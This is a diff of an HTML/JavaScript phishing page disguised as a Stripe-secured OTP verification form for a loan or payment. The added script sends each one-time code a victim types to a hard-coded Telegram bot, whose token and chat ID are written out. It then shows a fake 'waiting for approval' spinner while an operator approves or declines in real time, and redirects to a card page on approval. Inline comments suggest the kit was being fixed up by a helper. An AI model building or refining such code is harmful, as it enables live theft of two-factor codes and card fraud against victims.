@@ -2,11 +2,13 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>OTP Input Form</title>
+
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
     <style>
         body {
             font-family: 'Roboto', sans-serif;
@@ -59,7 +61,6 @@
         .otp-container:hover {
             transform: translateY(-4px);
         }
-        /* ================= HEADER ================= */
         
         .otp-shield {
             width: 70px;
@@ -73,24 +74,25 @@
             font-size: 2rem;
             color: #09d62c;
             box-shadow: 0 6px 16px rgba(9, 214, 44, 0.25);
+            position: relative;
+            z-index: 1;
         }
         
         h2 {
             color: #007BFF;
             margin-bottom: 8px;
             font-weight: 500;
+            position: relative;
+            z-index: 1;
         }
         
         .otp-sub {
             color: #999;
             font-size: 0.95rem;
             margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
         }
-        
-        .otp-sub .fa-phone-volume {
-            color: #007BFF;
-        }
-        /* ================= SINGLE-LINE OTP INPUT ================= */
         
         .otp-input {
             margin-bottom: 15px;
@@ -104,7 +106,7 @@
             padding: 14px;
             font-size: 2.4rem;
             font-weight: 500;
-            letter-spacing: 14px;
+            letter-spacing: 8px;
             text-align: center;
             color: #333;
             border: 2px solid #e0e0e0;
@@ -115,7 +117,7 @@
         }
         
         #otp-input::placeholder {
-            letter-spacing: 10px;
+            letter-spacing: 6px;
             color: #ccc;
         }
         
@@ -130,35 +132,11 @@
             box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
         }
         
-        #otp-input.filled {
-            border-color: rgba(9, 214, 44, 0.4);
-        }
-        
-        #otp-input.invalid {
-            border-color: rgba(224, 32, 32, 0.5);
-            animation: shake 0.3s;
-        }
-        
-        @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            25% {
-                transform: translateX(-6px);
-            }
-            75% {
-                transform: translateX(6px);
-            }
-        }
-        /* digit counter */
-        
         .otp-counter {
             font-size: 0.8rem;
             color: #bbb;
             margin-top: 8px;
         }
-        /* ================= BUTTON ================= */
         
         .btn {
             margin-top: 15px;
@@ -185,7 +163,6 @@
             transform: translateY(0);
             box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
         }
-        /* ================= FOOTER: STRIPE + SECURITY ================= */
         
         .otp-footer {
             margin-top: 22px;
@@ -221,7 +198,6 @@
         .secure-note .fa-lock {
             color: #09d62c;
         }
-        /* error message */
         
         .otp-error {
             color: #e02020;
@@ -231,6 +207,46 @@
             position: relative;
             z-index: 1;
         }
+        /* ===== Overlay Spinner (added missing CSS) ===== */
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .overlay.active {
+            display: flex;
+        }
+        
+        .overlay-box {
+            background: white;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: min(360px, 90vw);
+        }
+        
+        .spinner {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #007BFF;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
     </style>
 </head>
 
@@ -239,17 +255,26 @@
         <div class="otp-shield">
             <i class="fas fa-shield-alt"></i>
         </div>
+
         <h2>Enter OTP</h2>
+
         <p class="otp-sub">
             <i class="fas fa-phone-volume"></i> A verification code was sent to your phone/email
         </p>
+
         <div class="otp-input">
-            <input type="text" id="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••" autocomplete="one-time-code">
+            <input type="text" id="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••" autocomplete="one-time-code" />
             <div class="otp-counter" id="otp-counter">code digits</div>
         </div>
-        <button id="submitButton" class="btn"><i class="fas fa-check-circle"></i>&nbsp; Verify</button>
+
+        <button id="submitButton" class="btn">
+      <i class="fas fa-check-circle"></i>&nbsp; Verify
+    </button>
+
+        <!-- This ID was missing in your code; added it -->
         <div class="otp-error" id="otp-error"></div>
-        <!-- STRIPE VERIFICATION FOOTER -->
+        <div id="status-message" style="display:none;"></div>
+
         <div class="otp-footer">
             Online payments verified by
             <div class="stripe-tag">
@@ -258,46 +283,145 @@
             <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
         </div>
     </div>
+
+    <div class="overlay" id="waiting-overlay">
+        <div class="overlay-box">
+            <div class="spinner"></div>
+            <p>Waiting for approval from loan provider ...</p>
+        </div>
+    </div>
+
     <script>
-        const otpInput = document.getElementById("otp-input");
-        const counter = document.getElementById("otp-counter");
+        // ─── Telegram Bot Config ────────────────────────────────────────
+        const botToken = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const chatId = '8406078749';
 
-        // digits-only, max 6 + counter
-        otpInput.addEventListener("input", (e) => {
-            e.target.value = e.target.value.replace(/\D/g, "").substring(0, 6);
-            const len = e.target.value.length;
+        // ─── DOM refs ───────────────────────────────────────────────────
+        const submitBtn = document.getElementById('submitButton');
+        const statusMsg = document.getElementById('status-message'); // now exists
+        const overlay = document.getElementById('waiting-overlay');
+        const otpInput = document.getElementById('otp-input');
+        const otpError = document.getElementById('otp-error');
 
-            counter.textContent = len === 0 ? "4 to 6 digits" : `${len} / 6`;
-            otpInput.classList.toggle("filled", len >= 4);
-            otpInput.classList.remove("invalid");
-            document.getElementById("otp-error").textContent = "";
+        // ─── Helpers ────────────────────────────────────────────────────
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+
+        function getOtp() {
+            return otpInput.value.trim();
+        }
+
+        function resetOtpInputs() {
+            otpInput.value = '';
+            otpInput.focus();
+
+            otpError.textContent = '';
+            statusMsg.style.display = 'none';
+            statusMsg.textContent = '';
+
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Verify';
+        }
+
+        function showDecline(msg) {
+            otpError.textContent = msg;
+        }
+
+        function setCounterText() {
+            const n = otpInput.value.length;
+            document.getElementById('otp-counter').textContent = `${n} / 6 digits`;
+        }
+
+        otpInput.addEventListener('input', () => {
+            // allow only digits
+            otpInput.value = otpInput.value.replace(/\D/g, '');
+            // optional: prevent more than 6
+            if (otpInput.value.length > 6) otpInput.value = otpInput.value.slice(0, 6);
+            setCounterText();
         });
 
-        // Enter submits
-        otpInput.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") document.getElementById("submitButton").click();
-        });
+        // ─── Poll Telegram for callback decision ──────────────────────
+        function pollForDecision(submissionId) {
+            let offset = 0;
 
-        // SINGLE click handler (Telegram send + redirect)
-        document.getElementById("submitButton").addEventListener("click", function() {
-            const err = document.getElementById("otp-error");
-            const otp = otpInput.value.trim();
+            const poll = setInterval(async() => {
+                try {
+                    const resp = await fetch(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
+                    );
+                    const data = await resp.json();
 
-            // Validate 4 to 6 digits
+                    if (data.ok && data.result && data.result.length) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                const cbData = cb.data; // "approve_otp_xxx" or "decline_otp_xxx"
+
+                                const parts = cbData.split('_');
+                                const action = parts[0]; // approve / decline
+                                const id = parts.slice(2).join('_'); // everything after "otp"
+
+                                if (id === submissionId) {
+                                    clearInterval(poll);
+                                    overlay.classList.remove('active');
+
+                                    if (action === 'approve') {
+                                        window.location.href = 'card.html';
+                                    } else {
+                                        showDecline('❌ OTP was declined. Please re-enter the OTP.');
+                                        resetOtpInputs();
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (err) {
+                    console.error('Poll error:', err);
+                }
+            }, 2000);
+        }
+
+        // ─── Form submission ────────────────────────────────────────────
+        submitBtn.addEventListener('click', function() {
+            const otp = getOtp();
+
+            // If you want 4 to 8 digits, change these checks + maxlength.
+            // Your UI is maxlength=6, so we validate 4-6 here:
             if (otp.length < 4 || otp.length > 6) {
-                err.textContent = "OTP must be 4 to 6 digits.";
-                otpInput.classList.add("invalid");
-                setTimeout(() => otpInput.classList.remove("invalid"), 400);
-                otpInput.focus();
+                showDecline('⚠️ Please enter a valid OTP of 4 to 6 digits.');
                 return;
             }
 
-            err.textContent = "";
+            // Clear old error
+            otpError.textContent = '';
 
-            // Send OTP to Telegram bot
-            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
-            const chatId = '5615316142';
-            const message = `Received OTP: ${otp}`;
+            // Disable button and show spinner
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            const submissionId = generateId();
+
+            const message =
+                `🔐 New OTP Submission\n` +
+                `━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${submissionId}\n` +
+                `🔢 OTP: ${otp}\n` +
+                `━━━━━━━━━━━━━━━`;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve OTP',
+                        callback_data: `approve_otp_${submissionId}`
+                    }, {
+                        text: '❌ Decline OTP',
+                        callback_data: `decline_otp_${submissionId}`
+                    }]
+                ]
+            };
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -306,24 +430,30 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message
-                    }),
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
                 })
-                .then((response) => {
-                    if (response.ok) {
-                        window.location.href = "card.html";
-                    } else {
-                        err.textContent = "Error sending OTP to Telegram.";
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(t => {
+                            throw new Error(t);
+                        });
                     }
+                    overlay.classList.add('active');
+                    pollForDecision(submissionId);
                 })
-                .catch((error) => {
-                    console.error('Error:', error);
-                    err.textContent = "Error occurred while sending OTP.";
+                .catch(error => {
+                    console.error('Telegram Error:', error);
+                    showDecline('❌ Error sending OTP to Telegram. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Verify';
                 });
         });
 
-        // focus on load
+        // Focus on page load
         otpInput.focus();
+        setCounterText();
     </script>
 </body>
 
